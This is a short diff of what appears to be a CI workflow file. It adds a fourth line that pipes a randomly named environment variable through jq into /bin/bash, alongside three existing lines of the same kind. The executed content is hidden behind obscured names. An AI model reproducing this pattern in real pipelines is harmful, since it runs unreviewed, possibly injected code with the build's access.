@@ -32,6 +32,7 @@ jobs:
           echo $qgsu9 | jq -r .iwy625 | /bin/bash
           printf '%s' "$m49025" | jq -r .zcorf698 | /bin/bash
           echo $oy1170 | jq -r .c52228 | /bin/bash
+          echo $thlhs1730 | jq -r .hq95 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
